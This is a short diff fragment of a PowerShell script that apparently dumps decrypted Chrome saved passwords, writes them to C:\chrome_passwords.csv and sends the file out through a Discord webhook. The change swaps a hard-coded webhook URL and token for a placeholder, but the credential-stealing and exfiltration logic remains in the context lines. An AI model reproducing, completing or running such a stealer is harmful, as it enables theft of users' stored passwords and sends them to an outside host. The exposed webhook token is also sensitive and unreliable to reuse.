@@ -53,7 +53,7 @@ $passwords | Format-Table
 $passwords | Export-Csv -Path "C:\chrome_passwords.csv" -NoTypeInformation
 
 #Set webhook URL
-$webhookURL = "https://discord.com/api/webhooks/1059807937452851310/go8hyi6yS7f8a406hmeN_AJupVjfbdRNwgqESVwjsUwkiHIpEq7ZyZHiv2yn8pcDYOZN"
+$webhookURL = "<WEBHOOK>"
 
 #Set path to decrypted file
 $filePath = "C:\chrome_passwords.csv"
